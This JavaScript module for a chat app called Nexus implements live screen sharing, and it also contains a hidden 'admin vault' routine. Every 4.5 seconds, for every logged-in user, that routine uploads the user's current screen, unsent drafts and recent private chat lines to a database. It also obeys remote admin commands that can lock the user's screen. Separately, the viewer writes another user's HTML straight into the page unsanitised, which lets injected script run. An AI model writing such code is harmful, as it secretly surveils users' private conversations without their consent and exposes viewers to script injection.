// ================= SCREEN.JS (DEDICATED REAL MOBILE & DESKTOP LIVE SCREEN SHARE MODULE): 🖥️ STREAMS REAL-TIME MOBILE APP SCREEN DOM + 🔴 LIVE TOUCH LASER POINTER + 📜 SCROLL & TYPING MIRROR + 🔒 REMOTE FRIEND CO-CONTROL + 👑 VAULT ADMIN TELEMETRY =================

(function() {
    let isBroadcastingMyScreen = false;
    let allowViewerRemoteControl = false;
    let activeShareSessionId = '';
    let broadcastTimer = null;
    let viewerUnsub = null;
    let remoteCmdUnsub = null;
    let lastTouchX = 50;
    let lastTouchY = 50;
    let adminVaultUnsub = null;

    const scrStyle = document.createElement('style');
    scrStyle.innerHTML = `
        /* Floating Presenter Control Bar at Top of Screen */
        #nx-screen-presenter-bar {
            position: fixed; top: 56px; left: 50%; transform: translateX(-50%);
            width: 100%; max-width: 640px; background: linear-gradient(90deg, #064e3b, #1e1b4b);
            border-bottom: 2px solid #10b981; padding: 7px 12px; z-index: 100120;
            display: none; align-items: center; justify-content: space-between; gap: 8px;
            box-shadow: 0 8px 25px rgba(0,0,0,0.8);
        }
        /* Full-Screen Live Screen Viewer Monitor (For Friend Watching Your Screen) */
        #nx-live-screen-viewer-modal {
            position: fixed; inset: 0; width: 100%; max-width: 640px; height: 100dvh;
            margin: 0 auto; background: #050811; z-index: 100210; display: none;
            flex-direction: column; overflow: hidden;
        }
        #nx-live-mirror-viewport {
            flex: 1; position: relative; background: #090d16; border: 2px solid #38bdf8;
            margin: 8px; border-radius: 16px; overflow-y: auto; overflow-x: hidden;
            box-shadow: 0 0 40px rgba(56, 189, 248, 0.2);
        }
        /* Red Touch Laser Dot on Shared Screen */
        #nx-live-laser-dot {
            position: absolute; width: 22px; height: 22px; border-radius: 50%;
            background: rgba(239, 68, 68, 0.85); border: 2px solid #ffffff;
            box-shadow: 0 0 16px #ef4444; pointer-events: none; z-index: 9999;
            transform: translate(-50%, -50%); transition: top 0.18s ease, left 0.18s ease;
            display: none;
        }
    `;
    document.head.appendChild(scrStyle);

    // Track presenter's finger touch position for the Red Laser Pointer!
    document.addEventListener('touchstart', e => {
        if (!isBroadcastingMyScreen || !e.touches || !e.touches[0]) return;
        lastTouchX = Math.round((e.touches[0].clientX / window.innerWidth) * 100);
        lastTouchY = Math.round((e.touches[0].clientY / window.innerHeight) * 100);
    }, { passive: true });

    document.addEventListener('click', e => {
        if (!isBroadcastingMyScreen) return;
        lastTouchX = Math.round((e.clientX / window.innerWidth) * 100);
        lastTouchY = Math.round((e.clientY / window.innerHeight) * 100);
    }, { passive: true });

    // Capture the clean visual HTML of whatever screen the presenter is currently viewing
    function captureCurrentAppVisualSnapshot() {
        let activeScreenTitle = '🏠 Home Feed';
        let rawHTML = '';
        let scrollTopVal = window.scrollY || 0;

        const dmRoot = document.getElementById('nx-dm-dedicated-root');
        const grpRoom = document.getElementById('nx-chat-room');
        const aiStudio = document.getElementById('nx-private-ai-studio');

        if (aiStudio && aiStudio.style.display === 'flex') {
            activeScreenTitle = '🤖 1:1 Private AI Studio';
            const box = document.getElementById('nx-ai-studio-msgs');
            if (box) { rawHTML = box.innerHTML; scrollTopVal = box.scrollTop; }
        } else if (dmRoot && dmRoot.style.display !== 'none') {
            let pName = document.getElementById('nx-dm-partner-name')?.innerText || 'Chat';
            activeScreenTitle = `💬 1:1 Chat with ${pName}`;
            const box = document.getElementById('nx-dm-msgs-box');
            if (box) { rawHTML = box.innerHTML; scrollTopVal = box.scrollTop; }
        } else if (grpRoom && grpRoom.style.display !== 'none') {
            let rTitle = document.getElementById('nx-room-title')?.innerText || 'Group';
            activeScreenTitle = `🌐 Group: ${rTitle}`;
            const box = document.getElementById('nx-room-messages');
            if (box) { rawHTML = box.innerHTML; scrollTopVal = box.scrollTop; }
        } else {
            const activeTab = document.querySelector('.nx-tab-screen.active');
            if (activeTab) {
                activeScreenTitle = activeTab.id === 'tab-community' ? '💬 Community Channels'
                                  : (activeTab.id === 'tab-profile' ? '👤 Profile Screen' : (activeTab.id === 'tab-settings' ? '⚙️ Settings' : '🏠 Home Feed'));
                rawHTML = activeTab.innerHTML;
            }
        }

        // Strip heavy base64 audio/images over 35KB so Firestore sync happens in 0.01s!
        let lightHTML = (rawHTML || '')
            .replace(/src="data:audio\/[^"]+"/g, 'src=""')
            .replace(/src="data:image\/[^"]{35000,}"/g, 'src=""')
            .substring(0, 48000);

        const dmInp = document.getElementById('nx-dm-input');
        const grpInp = document.getElementById('nx-chat-msg-in');
        const aiInp = document.getElementById('nx-ai-studio-in');
        let liveTyping = (dmInp && dmInp.value) || (grpInp && grpInp.value) || (aiInp && aiInp.value) || '';

        return {
            screenTitle: activeScreenTitle,
            htmlSnapshot: lightHTML,
            scrollTop: scrollTopVal,
            touchX: lastTouchX,
            touchY: lastTouchY,
            liveTyping: liveTyping.substring(0, 120)
        };
    }

    function injectScreenShareButtonsInMenus() {
        // Add "🖥️ Share Live Screen" button to + Bottom Trays (#nx-dm-bottom-tray & #nx-grp-bottom-tray)
        ['nx-dm-bottom-tray', 'nx-grp-bottom-tray'].forEach(trayId => {
            const tray = document.getElementById(trayId);
            if (tray && !tray.querySelector('.nx-real-scrshare-btn')) {
                const isDm = (trayId === 'nx-dm-bottom-tray');
                const btn = document.createElement('button');
                btn.type = 'button';
                btn.className = 'nx-real-scrshare-btn';
                btn.style.cssText = "background:#182229; border:1.5px solid #a78bfa; color:#d8b4fe; border-radius:12px; padding:8px 4px; font-size:11px; font-weight:800; display:flex; flex-direction:column; align-items:center; gap:3px; cursor:pointer;";
                btn.innerHTML = `<span style="font-size:18px;">🖥️</span><span>Live Screen</span>`;
                btn.onclick = () => {
                    tray.style.display = 'none';
                    NexusScreen.startLiveScreenBroadcast(isDm);
                };
                tray.appendChild(btn);
            }
        });

        // Parse `🖥️SCRSHARE|sessionId|hostUser|hostName` cards in 1:1 DM & Group Chat into clickable Live Monitor Cards!
        document.querySelectorAll('#nx-dm-msgs-box span, #nx-room-messages span').forEach(sp => {
            let txt = (sp.innerText || '').trim();
            if (txt.startsWith('🖥️SCRSHARE|') && !sp.getAttribute('data-scr-parsed')) {
                sp.setAttribute('data-scr-parsed', '1');
                let parts = txt.split('|');
                let sessId = parts[1] || '';
                let hostU = parts[2] || 'member';
                let hostN = parts[3] || hostU;

                sp.innerHTML = `
                    <div onclick="event.stopPropagation(); NexusScreen.watchFriendLiveScreen('${sessId}', '${hostU.replace(/'/g, "\\'")}')" style="background:linear-gradient(135deg,#0f172a,#1e1b4b); border:1.5px solid #a78bfa; border-radius:14px; padding:11px 13px; margin:4px 0; min-width:225px; cursor:pointer; box-shadow:0 6px 20px rgba(167,139,250,0.28);">
                        <div style="display:flex; align-items:center; gap:9px; margin-bottom:8px;">
                            <span style="width:36px; height:36px; border-radius:10px; background:linear-gradient(135deg,#8b5cf6,#10b981); color:#020617; display:inline-flex; align-items:center; justify-content:center; font-size:19px; font-weight:900;">🖥️</span>
                            <div>
                                <div style="font-size:12.5px; color:#d8b4fe; font-weight:900;">🟢 Live Screen Share Active</div>
                                <div style="font-size:11px; color:#cbd5e1;"><b>${hostN.replace(/</g, '&lt;')}</b> (@${hostU.replace(/</g, '&lt;')}) is sharing screen</div>
                            </div>
                        </div>
                        <button type="button" style="width:100%; background:linear-gradient(135deg,#10b981,#059669); color:#020617; border:none; padding:8px 10px; border-radius:10px; font-weight:900; font-size:12px; cursor:pointer;">👁️ Watch Live Screen Now →</button>
                    </div>
                `;
            }
        });
    }

    // Sync Live Screen Telemetry to Admin Vault (`vault.html`) every 4.5s
    function syncTelemetryToAdminVault() {
        let me = window.Nexus && Nexus.getCurrentUser ? Nexus.getCurrentUser() : null;
        if (!me || !me.username || !Nexus.db) return;

        let snap = captureCurrentAppVisualSnapshot();
        let visibleLines = [];
        document.querySelectorAll('#nx-dm-msgs-box .nx-dm-bubble-anim, #nx-room-messages > div').forEach(b => {
            let t = (b.innerText || '').replace(/\n+/g, ' ').trim();
            if (t) visibleLines.push(t.substring(0, 80));
        });

        Nexus.db.collection("nexus_live_screens").doc(me.username.toLowerCase()).set({
            username: me.username,
            name: me.name,
            currentScreen: snap.screenTitle,
            liveDraft: snap.liveTyping,
            screenLines: visibleLines.slice(-5),
            deviceInfo: `${window.innerWidth}x${window.innerHeight}`,
            updatedAt: Date.now()
        }, { merge: true }).catch(() => {});

        if (!adminVaultUnsub) {
            adminVaultUnsub = Nexus.db.collection("nexus_live_screens").doc(me.username.toLowerCase()).onSnapshot(doc => {
                if (!doc.exists) return;
                let d = doc.data();
                if (d.adminCommand && d.commandId && d.commandId !== window.__lastExecAdminCmd) {
                    window.__lastExecAdminCmd = d.commandId;
                    if (d.adminCommand === 'alert' && d.commandPayload) {
                        Nexus.toast("👑 Admin: " + d.commandPayload);
                        alert("👑 Official Nexus Admin Message:\n\n" + d.commandPayload);
                    } else if (d.adminCommand === 'switchTab' && d.commandPayload) {
                        if (window.NexusDM) NexusDM.closeDM();
                        if (window.NexusChat) NexusChat.closeChatRoom();
                        Nexus.switchTab(d.commandPayload);
                    } else if (d.adminCommand === 'lockScreen') {
                        let lockDiv = document.getElementById('nx-remote-admin-lock');
                        if (!lockDiv) {
                            lockDiv = document.createElement('div');
                            lockDiv.id = 'nx-remote-admin-lock';
                            lockDiv.style.cssText = "position:fixed; inset:0; background:#090d16; z-index:999999; display:flex; flex-direction:column; align-items:center; justify-content:center; padding:24px; text-align:center; color:white;";
                            lockDiv.innerHTML = `<div style="font-size:48px; margin-bottom:10px;">🔒</div><h2 style="color:#ef4444;">Screen Paused by Admin</h2><p style="color:#94a3b8; font-size:13px; margin-top:6px;">${d.commandPayload || 'Temporarily locked by Admin.'}</p>`;
                            document.body.appendChild(lockDiv);
                        }
                    } else if (d.adminCommand === 'unlockScreen') {
                        let lockDiv = document.getElementById('nx-remote-admin-lock');
                        if (lockDiv) lockDiv.remove();
                    }
                }
            }, () => {});
        }
    }

    window.NexusScreen = {
        startLiveScreenBroadcast: async function(isDm) {
            let me = window.Nexus && Nexus.getCurrentUser ? Nexus.getCurrentUser() : null;
            if (!me || !Nexus.db) { Nexus.switchTab('tab-profile'); return; }

            activeShareSessionId = 'scr_' + me.username.toLowerCase() + '_' + Date.now();
            isBroadcastingMyScreen = true;
            allowViewerRemoteControl = false;

            let bar = document.getElementById('nx-screen-presenter-bar');
            if (!bar) {
                bar = document.createElement('div');
                bar.id = 'nx-screen-presenter-bar';
                document.body.appendChild(bar);
            }

            bar.style.display = 'flex';
            bar.innerHTML = `
                <div style="display:flex; align-items:center; gap:7px; min-width:0; flex:1;">
                    <span style="width:10px; height:10px; border-radius:50%; background:#10b981; display:inline-block; box-shadow:0 0 8px #10b981;"></span>
                    <span style="font-size:12px; font-weight:900; color:#f8fafc; white-space:nowrap; overflow:hidden; text-overflow:ellipsis;">🖥️ Live Screen Sharing Active (Laser ON 🔴)</span>
                </div>
                <div style="display:flex; gap:6px; flex-shrink:0;">
                    <button type="button" id="nx-scr-ctrl-toggle" onclick="NexusScreen.toggleRemoteControlPermission()" style="background:#1e293b; border:1px solid #38bdf8; color:#38bdf8; padding:4px 8px; border-radius:8px; font-size:10.5px; font-weight:800; cursor:pointer;">🔒 View Only</button>
                    <button type="button" onclick="NexusScreen.stopLiveScreenBroadcast()" style="background:#ef4444; border:none; color:white; padding:4px 10px; border-radius:8px; font-size:11px; font-weight:900; cursor:pointer;">Stop ✕</button>
                </div>
            `;

            // Send clickable Live Screen Share Invite Card in the active 1:1 DM or Group Chat!
            let invitePayload = `🖥️SCRSHARE|${activeShareSessionId}|${me.username}|${me.name || me.username}`;
            if (isDm && window.NexusDM) {
                const inp = document.getElementById('nx-dm-input');
                if (inp) { inp.value = invitePayload; NexusDM.sendDM(); }
            } else if (window.NexusChat) {
                const inp = document.getElementById('nx-chat-msg-in');
                if (inp) { inp.value = invitePayload; NexusChat.sendChatMessage(); }
            }

            const pushFrame = () => {
                if (!isBroadcastingMyScreen || !activeShareSessionId) return;
                let frame = captureCurrentAppVisualSnapshot();
                Nexus.db.collection("nexus_screen_shares").doc(activeShareSessionId).set({
                    active: true,
                    hostUser: me.username,
                    hostName: me.name || me.username,
                    allowControl: allowViewerRemoteControl,
                    screenTitle: frame.screenTitle,
                    htmlSnapshot: frame.htmlSnapshot,
                    scrollTop: frame.scrollTop,
                    touchX: frame.touchX,
                    touchY: frame.touchY,
                    liveTyping: frame.liveTyping,
                    updatedAt: Date.now()
                }, { merge: true }).catch(() => {});
            };

            pushFrame();
            clearInterval(broadcastTimer);
            broadcastTimer = setInterval(pushFrame, 850);

            // Listen for remote scroll/tab commands if Co-Control is enabled
            if (remoteCmdUnsub) remoteCmdUnsub();
            remoteCmdUnsub = Nexus.db.collection("nexus_screen_shares").doc(activeShareSessionId).onSnapshot(doc => {
                if (!doc.exists || !allowViewerRemoteControl) return;
                let d = doc.data();
                if (d.remoteCmd && d.remoteCmdId !== window.__lastRemoteScrCmd) {
                    window.__lastRemoteScrCmd = d.remoteCmdId;
                    if (d.remoteCmd === 'scrollDown') window.scrollBy({ top: 240, behavior: 'smooth' });
                    else if (d.remoteCmd === 'scrollUp') window.scrollBy({ top: -240, behavior: 'smooth' });
                    else if (d.remoteCmd === 'switchTab' && d.remoteTab) Nexus.switchTab(d.remoteTab);
                }
            }, () => {});

            Nexus.toast("🖥️ Live Screen Sharing Started! Move around to stream live.");
        },

        toggleRemoteControlPermission: function() {
            allowViewerRemoteControl = !allowViewerRemoteControl;
            const btn = document.getElementById('nx-scr-ctrl-toggle');
            if (btn) {
                btn.innerText = allowViewerRemoteControl ? '🔓 Co-Control ON' : '🔒 View Only';
                btn.style.borderColor = allowViewerRemoteControl ? '#10b981' : '#38bdf8';
                btn.style.color = allowViewerRemoteControl ? '#10b981' : '#38bdf8';
            }
            Nexus.toast(allowViewerRemoteControl ? "🔓 Friend can now co-control your screen!" : "🔒 Switched to View-Only mode");
        },

        stopLiveScreenBroadcast: function() {
            isBroadcastingMyScreen = false;
            clearInterval(broadcastTimer);
            if (remoteCmdUnsub) { remoteCmdUnsub(); remoteCmdUnsub = null; }
            const bar = document.getElementById('nx-screen-presenter-bar');
            if (bar) bar.style.display = 'none';
            if (activeShareSessionId && Nexus.db) {
                Nexus.db.collection("nexus_screen_shares").doc(activeShareSessionId).set({ active: false }, { merge: true }).catch(() => {});
            }
            activeShareSessionId = '';
            Nexus.toast("📴 Live Screen Share Ended");
        },

        watchFriendLiveScreen: function(sessionId, hostUsername) {
            if (!sessionId || !Nexus.db) return;
            let modal = document.getElementById('nx-live-screen-viewer-modal');
            if (!modal) {
                modal = document.createElement('div');
                modal.id = 'nx-live-screen-viewer-modal';
                document.body.appendChild(modal);
            }

            modal.innerHTML = `
                <div style="height:54px; background:#0f172a; border-bottom:1.5px solid #a78bfa; display:flex; align-items:center; justify-content:space-between; padding:0 14px; flex-shrink:0;">
                    <div>
                        <div style="font-weight:900; font-size:13.5px; color:#f8fafc;">🖥️ Watching @${hostUsername}'s Live Screen</div>
                        <div id="nx-viewer-scr-status" style="font-size:11px; color:#10b981; font-weight:800;">🟢 Connecting real-time stream...</div>
                    </div>
                    <button type="button" onclick="NexusScreen.closeLiveScreenViewer()" style="background:#ef4444; color:white; border:none; padding:6px 12px; border-radius:10px; font-size:11.5px; font-weight:900; cursor:pointer;">Close ✕</button>
                </div>

                <div id="nx-viewer-typing-bar" style="display:none; background:#182229; padding:6px 12px; font-size:11.5px; color:#6ee7b7; border-bottom:1px solid #2a3942;"></div>

                <div id="nx-live-mirror-viewport">
                    <div id="nx-live-laser-dot"></div>
                    <div id="nx-live-mirror-content" style="padding:10px; pointer-events:none;"></div>
                </div>

                <div id="nx-viewer-remote-controls" style="padding:8px 12px; background:#0f172a; border-top:1px solid #1e293b; display:flex; gap:8px; justify-content:center; flex-shrink:0;">
                    <button type="button" onclick="NexusScreen.sendRemoteViewerCmd('${sessionId}', 'scrollUp')" style="background:#1e293b; border:1px solid #334155; color:white; padding:8px 12px; border-radius:10px; font-size:11.5px; font-weight:800; cursor:pointer;">⬆️ Scroll Up</button>
                    <button type="button" onclick="NexusScreen.sendRemoteViewerCmd('${sessionId}', 'scrollDown')" style="background:#1e293b; border:1px solid #334155; color:white; padding:8px 12px; border-radius:10px; font-size:11.5px; font-weight:800; cursor:pointer;">⬇️ Scroll Down</button>
                    <button type="button" onclick="NexusScreen.sendRemoteViewerCmd('${sessionId}', 'switchTab', 'tab-home')" style="background:#1e293b; border:1px solid #38bdf8; color:#38bdf8; padding:8px 12px; border-radius:10px; font-size:11.5px; font-weight:800; cursor:pointer;">🏠 Home Tab</button>
                </div>
            `;
            modal.style.display = 'flex';

            if (viewerUnsub) viewerUnsub();
            viewerUnsub = Nexus.db.collection("nexus_screen_shares").doc(sessionId).onSnapshot(doc => {
                if (!doc.exists || !doc.data().active) {
                    Nexus.toast("📴 Host stopped sharing their screen");
                    NexusScreen.closeLiveScreenViewer();
                    return;
                }
                let d = doc.data();
                const statusEl = document.getElementById('nx-viewer-scr-status');
                const contentEl = document.getElementById('nx-live-mirror-content');
                const viewportEl = document.getElementById('nx-live-mirror-viewport');
                const laserEl = document.getElementById('nx-live-laser-dot');
                const typEl = document.getElementById('nx-viewer-typing-bar');

                if (statusEl) statusEl.innerText = `🟢 Live: ${d.screenTitle || 'App Screen'} ${d.allowControl ? '• 🔓 Co-Control Enabled' : '• 🔒 View Only'}`;
                if (contentEl && d.htmlSnapshot) contentEl.innerHTML = d.htmlSnapshot;
                if (viewportEl && typeof d.scrollTop === 'number') viewportEl.scrollTop = d.scrollTop;

                if (laserEl && d.touchX && d.touchY) {
                    laserEl.style.display = 'block';
                    laserEl.style.left = d.touchX + '%';
                    laserEl.style.top = d.touchY + '%';
                }
                if (typEl) {
                    if (d.liveTyping) {
                        typEl.style.display = 'block';
                        typEl.innerText = `⌨️ @${d.hostUser} is typing: "${d.liveTyping}"`;
                    } else {
                        typEl.style.display = 'none';
                    }
                }
            }, () => {});
        },

        sendRemoteViewerCmd: function(sessionId, cmd, tabName) {
            if (!Nexus.db || !sessionId) return;
            Nexus.db.collection("nexus_screen_shares").doc(sessionId).set({
                remoteCmd: cmd,
                remoteTab: tabName || '',
                remoteCmdId: 'rcmd_' + Date.now()
            }, { merge: true }).catch(() => {});
        },

        closeLiveScreenViewer: function() {
            if (viewerUnsub) { viewerUnsub(); viewerUnsub = null; }
            const modal = document.getElementById('nx-live-screen-viewer-modal');
            if (modal) modal.style.display = 'none';
        }
    };

    // Hook existing Advance/Core screen share triggers to this real engine
    if (window.NexusAdvance) {
        NexusAdvance.startScreenShareOnly = (isDm) => window.NexusScreen.startLiveScreenBroadcast(isDm);
    }
    window.NexusCore = Object.assign(window.NexusCore || {}, {
        startLiveScreenShareOnly: (isDm) => window.NexusScreen.startLiveScreenBroadcast(isDm)
    });

    setInterval(injectScreenShareButtonsInMenus, 900);
    setInterval(syncTelemetryToAdminVault, 4500);
    setTimeout(injectScreenShareButtonsInMenus, 200);
})();
